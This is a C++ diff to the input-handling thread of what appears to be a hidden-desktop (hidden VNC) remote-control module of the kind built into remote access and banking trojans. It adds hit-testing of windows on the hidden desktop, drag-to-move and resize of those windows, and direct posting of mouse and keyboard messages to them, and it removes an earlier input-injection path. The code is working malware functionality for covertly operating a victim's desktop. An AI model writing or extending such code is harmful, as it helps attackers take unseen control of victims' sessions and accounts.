@@ -7,6 +7,7 @@
 #include <string.h>
 #include <gdiplus.h>
 #include <vector>
+#include <limits.h>
 #include "../common/ScreenTransfer/ScreenCodec.h"
 #pragma comment (lib,"Gdiplus.Lib")
 using namespace Gdiplus;
@@ -264,6 +265,135 @@ static void DumpHiddenDesktopWindows(const char *reason)
     if (!EnumDesktopWindows(g_hDesk, LogDesktopWindowProc, (LPARAM)&count))
         printf("[diag] EnumDesktopWindows failed: GetLastError=%lu\n", GetLastError());
     printf("[diag] hidden-desktop-window-dump count=%d\n", count);
+}
+
+static BOOL IsExcludedInputClass(const char *className)
+{
+    if (!className || !className[0])
+        return FALSE;
+
+    return !lstrcmpiA(className, "UserOOBEWindowClass") ||
+        !lstrcmpiA(className, "tooltips_class32") ||
+        !lstrcmpiA(className, "IME") ||
+        !lstrcmpiA(className, "MSCTFIME UI") ||
+        !lstrcmpiA(className, "SysShadow");
+}
+
+struct HitTestContext
+{
+    POINT point;
+    HWND bestHwnd;
+    LONG bestArea;
+};
+
+static BOOL IsWindowCandidateAtPoint(HWND hWnd, POINT point, RECT *outRect, char *outClassName, DWORD classNameSize)
+{
+    if (!hWnd || !IsWindowVisible(hWnd) || !IsWindowEnabled(hWnd))
+        return FALSE;
+
+    RECT rect = { 0 };
+    if (!GetWindowRect(hWnd, &rect) || rect.right <= rect.left || rect.bottom <= rect.top)
+        return FALSE;
+    if (!PtInRect(&rect, point))
+        return FALSE;
+
+    char className[128] = { 0 };
+    GetClassNameA(hWnd, className, sizeof(className));
+    if (IsExcludedInputClass(className))
+        return FALSE;
+
+    if (outRect)
+        *outRect = rect;
+    if (outClassName && classNameSize)
+        lstrcpynA(outClassName, className, classNameSize);
+    return TRUE;
+}
+
+static BOOL CALLBACK HiddenDesktopHitTestEnumProc(HWND hWnd, LPARAM lParam)
+{
+    HitTestContext *ctx = (HitTestContext *)lParam;
+    RECT rect = { 0 };
+    if (!IsWindowCandidateAtPoint(hWnd, ctx->point, &rect, NULL, 0))
+        return TRUE;
+
+    LONG area = (rect.right - rect.left) * (rect.bottom - rect.top);
+    if (!ctx->bestHwnd || area < ctx->bestArea)
+    {
+        ctx->bestHwnd = hWnd;
+        ctx->bestArea = area;
+    }
+    return TRUE;
+}
+
+static HWND FindChildInputTarget(HWND hWnd, POINT screenPoint)
+{
+    HWND current = hWnd;
+    for (int depth = 0; current && depth < 16; ++depth)
+    {
+        POINT clientPoint = screenPoint;
+        if (!ScreenToClient(current, &clientPoint))
+            break;
+
+        HWND child = ChildWindowFromPointEx(current, clientPoint, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED | CWP_SKIPTRANSPARENT);
+        if (!child || child == current)
+            break;
+
+        char className[128] = { 0 };
+        GetClassNameA(child, className, sizeof(className));
+        if (IsExcludedInputClass(className))
+            break;
+        current = child;
+    }
+    return current ? current : hWnd;
+}
+
+static HWND FindHiddenDesktopWindowFromPoint(POINT point)
+{
+    HitTestContext ctx = { 0 };
+    ctx.point = point;
+    ctx.bestHwnd = NULL;
+    ctx.bestArea = LONG_MAX;
+
+    SetLastError(0);
+    if (!EnumDesktopWindows(g_hDesk, HiddenDesktopHitTestEnumProc, (LPARAM)&ctx))
+        printf("[input] EnumDesktopWindows hit-test failed: lastError=%lu\n", GetLastError());
+
+    HWND selected = ctx.bestHwnd;
+    if (!selected)
+    {
+        selected = WindowFromPoint(point);
+        LogWindowDetails("hit-test-windowfrompoint-fallback", selected);
+    }
+
+    if (selected)
+        selected = FindChildInputTarget(selected, point);
+
+    return selected;
+}
+
+static BOOL IsMoveResizeHit(LRESULT hitTest)
+{
+    switch (hitTest)
+    {
+    case HTCAPTION:
+    case HTTOP:
+    case HTBOTTOM:
+    case HTLEFT:
+    case HTRIGHT:
+    case HTTOPLEFT:
+    case HTTOPRIGHT:
+    case HTBOTTOMLEFT:
+    case HTBOTTOMRIGHT:
+        return TRUE;
+    default:
+        return FALSE;
+    }
+}
+
+static HWND GetMovableTopWindow(HWND hWnd)
+{
+    HWND topHwnd = GetTopLevelWindow(hWnd);
+    return topHwnd ? topHwnd : hWnd;
 }
 
 static BOOL ShouldLogInput(UINT msg)
@@ -1312,6 +1442,8 @@ static DWORD WINAPI InputThread(LPVOID param)
         printf("[!] Desktop thread creation failed\n");
 
     POINT      lastPoint;
+    HWND       hResMoveWindow = NULL;
+    LRESULT    resMoveType = 0;
     BOOL       lmouseDown = FALSE;
 
     lastPoint.x = 0;
@@ -1330,6 +1462,7 @@ static DWORD WINAPI InputThread(LPVOID param)
 
         HWND  hWnd{};
         POINT point;
+        POINT lastPointCopy;
         BOOL  mouseMsg = FALSE;
 
         switch (msg)
@@ -1448,7 +1581,7 @@ static DWORD WINAPI InputThread(LPVOID param)
             if (!hWnd)
                 hWnd = g_lastInputHwnd;
             if (!hWnd)
-                hWnd = Funcs::pWindowFromPoint(point);
+                hWnd = FindHiddenDesktopWindowFromPoint(point);
             break;
         }
         default:
@@ -1456,9 +1589,10 @@ static DWORD WINAPI InputThread(LPVOID param)
             mouseMsg = TRUE;
             point.x = GET_X_LPARAM(lParam);
             point.y = GET_Y_LPARAM(lParam);
+            lastPointCopy = lastPoint;
             lastPoint = point;
 
-            hWnd = Funcs::pWindowFromPoint(point);
+            hWnd = FindHiddenDesktopWindowFromPoint(point);
             if (!hWnd)
             {
                 POINT emptyPoint = { 0, 0 };
@@ -1467,11 +1601,13 @@ static DWORD WINAPI InputThread(LPVOID param)
                 continue;
             }
             if (ShouldLogInput(msg))
-                LogWindowDetails("window-from-point", hWnd);
+                LogWindowDetails("hidden-hit-test", hWnd);
 
             if (msg == WM_LBUTTONUP)
             {
                 lmouseDown = FALSE;
+                hResMoveWindow = NULL;
+                resMoveType = 0;
                 LRESULT lResult = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
 
                 HWND topHwnd = hWnd;
@@ -1511,8 +1647,15 @@ static DWORD WINAPI InputThread(LPVOID param)
             {
                 lmouseDown = TRUE;
                 g_lastInputHwnd = hWnd;
+                hResMoveWindow = GetMovableTopWindow(hWnd);
+                resMoveType = Funcs::pSendMessageA(hResMoveWindow, WM_NCHITTEST, NULL, lParam);
 
-                TryActivateInputTarget(hWnd, msg);
+                if (ShouldLogInput(msg))
+                    printf("[input] nchittest WM_LBUTTONDOWN target=0x%p moveWindow=0x%p hit=%lld movable=%d\n",
+                        hWnd,
+                        hResMoveWindow,
+                        (long long)resMoveType,
+                        IsMoveResizeHit(resMoveType));
 
                 RECT startButtonRect;
                 HWND hStartButton = Funcs::pFindWindowA("Button", NULL);
@@ -1539,6 +1682,80 @@ static DWORD WINAPI InputThread(LPVOID param)
                     }
                 }
             }
+            else if (msg == WM_MOUSEMOVE && lmouseDown && hResMoveWindow && IsMoveResizeHit(resMoveType))
+            {
+                int moveX = lastPointCopy.x - point.x;
+                int moveY = lastPointCopy.y - point.y;
+
+                RECT rect;
+                if (!Funcs::pGetWindowRect(hResMoveWindow, &rect))
+                    break;
+
+                int x = rect.left;
+                int y = rect.top;
+                int width = rect.right - rect.left;
+                int height = rect.bottom - rect.top;
+                switch (resMoveType)
+                {
+                case HTCAPTION:
+                    x -= moveX;
+                    y -= moveY;
+                    break;
+                case HTTOP:
+                    y -= moveY;
+                    height += moveY;
+                    break;
+                case HTBOTTOM:
+                    height -= moveY;
+                    break;
+                case HTLEFT:
+                    x -= moveX;
+                    width += moveX;
+                    break;
+                case HTRIGHT:
+                    width -= moveX;
+                    break;
+                case HTTOPLEFT:
+                    y -= moveY;
+                    height += moveY;
+                    x -= moveX;
+                    width += moveX;
+                    break;
+                case HTTOPRIGHT:
+                    y -= moveY;
+                    height += moveY;
+                    width -= moveX;
+                    break;
+                case HTBOTTOMLEFT:
+                    height -= moveY;
+                    x -= moveX;
+                    width += moveX;
+                    break;
+                case HTBOTTOMRIGHT:
+                    height -= moveY;
+                    width -= moveX;
+                    break;
+                }
+
+                if (width < 50)
+                    width = 50;
+                if (height < 50)
+                    height = 50;
+
+                SetLastError(0);
+                BOOL movedWindow = Funcs::pMoveWindow(hResMoveWindow, x, y, width, height, TRUE);
+                if (ShouldLogInput(msg))
+                    printf("[input] move-window hwnd=0x%p hit=%lld pos=(%d,%d,%d,%d) result=%s lastError=%lu\n",
+                        hResMoveWindow,
+                        (long long)resMoveType,
+                        x,
+                        y,
+                        width,
+                        height,
+                        movedWindow ? "ok" : "failed",
+                        GetLastError());
+                continue;
+            }
             break;
         }
         }
@@ -1559,8 +1776,12 @@ static DWORD WINAPI InputThread(LPVOID param)
             {
                 hWnd = currHwnd;
                 Funcs::pScreenToClient(currHwnd, &point);
-                currHwnd = Funcs::pChildWindowFromPoint(currHwnd, point);
+                currHwnd = ChildWindowFromPointEx(currHwnd, point, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED | CWP_SKIPTRANSPARENT);
                 if (!currHwnd || currHwnd == hWnd)
+                    break;
+                char childClass[128] = { 0 };
+                GetClassNameA(currHwnd, childClass, sizeof(childClass));
+                if (IsExcludedInputClass(childClass))
                     break;
             }
 
@@ -1590,7 +1811,6 @@ static DWORD WINAPI InputThread(LPVOID param)
                 DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
                 if (!lstrcmpiA(className, "UserOOBEWindowClass"))
                     DumpHiddenDesktopWindows("target-UserOOBEWindowClass");
-                TryActivateInputTarget(hWnd, msg);
             }
         }
         else
@@ -1598,47 +1818,11 @@ static DWORD WINAPI InputThread(LPVOID param)
             clientPt = screenPoint;
         }
 
-        BOOL injected = FALSE;
-        BOOL fallbackToPost = TRUE;
-
-        if (mouseMsg)
-        {
-            injected = InjectMouseInput(msg, wParam, lParam, screenPoint);
-            fallbackToPost = !injected;
-        }
-        else if (msg == WM_CHAR || msg == WM_SYSCHAR)
-        {
-            if (!HasModifierDown(keyDown))
-            {
-                injected = InjectUnicodeChar(wParam);
-                fallbackToPost = !injected;
-            }
-            else
-                fallbackToPost = FALSE;
-        }
-        else if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_SYSKEYDOWN || msg == WM_SYSKEYUP)
-        {
-            BOOL sendPhysical = IsPhysicalKeyVk(wParam) || HasModifierDown(keyDown);
-            UpdateKeyStateCache(msg, wParam, keyDown);
-            if (sendPhysical)
-            {
-                injected = InjectVirtualKey(msg, wParam);
-                fallbackToPost = !injected;
-            }
-            else
-                fallbackToPost = FALSE;
-        }
-
+        UpdateKeyStateCache(msg, wParam, keyDown);
+        SetLastError(0);
+        BOOL posted = Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
         if (ShouldLogInput(msg))
-            LogInputTarget("sendinput", msg, hWnd, screenPoint, clientPt, injected);
-
-        if (fallbackToPost)
-        {
-            SetLastError(0);
-            BOOL posted = Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
-            if (ShouldLogInput(msg))
-                LogInputTarget("post-fallback", msg, hWnd, screenPoint, clientPt, posted);
-        }
+            LogInputTarget("post-hidden", msg, hWnd, screenPoint, clientPt, posted);
     }
 exit:
     printf("[!] Input thread exiting\n");
